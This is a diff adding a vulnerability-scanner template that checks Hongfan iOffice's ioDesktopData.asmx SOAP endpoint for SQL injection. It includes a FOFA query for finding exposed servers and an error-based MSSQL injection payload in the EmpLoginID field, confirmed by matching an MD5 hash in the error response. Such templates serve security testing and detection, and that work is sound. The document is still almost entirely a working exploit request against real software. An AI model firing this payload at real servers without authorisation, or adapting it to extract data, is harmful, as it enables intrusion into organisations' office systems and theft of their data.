@@ -1,0 +1,33 @@
+id: hongfan-iodesktopdata-sqli
+
+info:
+  name: 红帆iOffice ioDesktopData.asmx接口SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    fofa: (app="红帆-ioffice" || app="红帆-HFOffice")
+  tags: hongfan,sqli
+  created: 2024/03/05
+
+set:
+  randomInt: randomInt(100000, 999999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /iOffice/prg/set/wss/ioDesktopData.asmx
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+      body: |
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+        <soap:Header/>
+        <soap:Body>
+        <tem:GetDepSchedule>
+        <!--type: string-->
+        <tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','{{randomInt}}')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
+        </tem:GetDepSchedule>
+        </soap:Body>
+        </soap:Envelope>
+    expression: response.status == 500 && response.body.bcontains(bytes(md5(string(randomInt))))
+expression: r0()
